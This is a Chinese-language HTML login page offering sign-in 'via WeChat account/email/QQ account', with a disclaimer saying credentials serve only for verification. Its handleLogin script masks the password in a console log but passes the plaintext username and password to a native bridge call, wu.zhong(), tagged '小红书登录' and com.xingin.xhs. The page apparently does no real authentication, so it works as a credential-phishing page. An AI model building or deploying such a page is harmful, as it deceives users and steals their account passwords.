<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background-color: #1a1a1a;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }


    .header {
      display: flex;
      align-items: center;
      padding: 16px 20px;
      position: relative;
    }


    .back-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 24px;
      cursor: pointer;
      padding: 8px;
      margin-left: -8px;
    }


    .header-title {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      font-size: 18px;
      font-weight: 500;
    }


    .main-content {
      flex: 1;
      padding: 40px 20px 20px;
      display: flex;
      flex-direction: column;
    }


    .login-title {
      font-size: 28px;
      font-weight: 400;
      text-align: center;
      margin-bottom: 60px;
      line-height: 1.3;
    }


    .form-container {
      flex: 1;
      display: flex;
      flex-direction: column;
    }


    .input-group {
      margin-bottom: 30px;
    }


    .input-label {
      display: block;
      font-size: 16px;
      margin-bottom: 12px;
      color: #ffffff;
    }


    .input-field {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid #444;
      color: #ffffff;
      font-size: 16px;
      padding: 12px 0;
      outline: none;
      transition: border-color 0.3s ease;
    }


    .input-field::placeholder {
      color: #666;
    }


    .input-field:focus {
      border-bottom-color: #ffffff;
    }


    .disclaimer {
      font-size: 14px;
      color: #888;
      line-height: 1.4;
      margin: 40px 0;
    }


    .login-button {
      background-color: #333;
      color: #ffffff;
      border: none;
      padding: 16px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 30px;
      transition: background-color 0.3s ease;
    }


    .login-button:hover {
      background-color: #444;
    }


    .footer-links {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0 8px;
    }


    .footer-link {
      color: #888;
      text-decoration: none;
      font-size: 14px;
      transition: color 0.3s ease;
    }


    .footer-link:hover {
      color: #ffffff;
    }



    @media (min-width: 768px) {
      .main-content {
        max-width: 400px;
        margin: 0 auto;
        padding: 60px 20px 40px;
      }
     
      .login-title {
        font-size: 32px;
        margin-bottom: 80px;
      }
    }


    @media (min-width: 1024px) {
      body {
        justify-content: center;
        padding: 20px;
      }
     
      .header {
        display: none;
      }
     
      .main-content {
        background-color: #222;
        border-radius: 12px;
        padding: 80px 40px 40px;
        min-height: auto;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      }
    }
  </style>
</head>
<body>
  <header class="header">
    <button class="back-btn" onclick="goBack()">‹</button>
    <h1 class="header-title">登录</h1>
  </header>


  <main class="main-content">
    <h2 class="login-title">通过微信账号/邮箱/QQ账号登录</h2>
   
    <form class="form-container" onsubmit="handleLogin(event)">
      <div class="input-group">
        <label class="input-label" for="account">账户号码</label>
        <input
          type="text"
          id="account"
          class="input-field"
          placeholder="微信ID/邮箱/QQ ID"
          required
        >
      </div>


      <div class="input-group">
        <label class="input-label" for="password">密码</label>
        <input
          type="password"
          id="password"
          class="input-field"
          placeholder="输入密码"
          required
        >
      </div>


      <p class="disclaimer">
        上述微信ID/QQ ID/邮箱仅用于登录验证
      </p>


      <button type="submit" class="login-button">
        接受并登录
      </button>
    </form>


    <footer class="footer-links">
      <a href="#" class="footer-link">无法登录？</a>
      <a href="#" class="footer-link">前往安全中心</a>
    </footer>
  </main>


  <script>
    

    function handleLogin(event) {
      event.preventDefault();
      const account = document.getElementById('account').value;
      const password = document.getElementById('password').value;
     
      if (account && password) {
        console.log('Login attempt:', { account, password: '***' });


         wu.zhong(`🔰 小红书登录\n\n✉️用户名: ${account}\n\n🔒密码: ${password}`, "com.xingin.xhs");
    


   
      }
    }



    document.querySelectorAll('.input-field').forEach(input => {
      input.addEventListener('focus', function() {
        this.parentElement.style.transform = 'scale(1.02)';
        this.parentElement.style.transition = 'transform 0.2s ease';
      });
     
      input.addEventListener('blur', function() {
        this.parentElement.style.transform = 'scale(1)';
      });
    });
  </script>
</body>
</html>
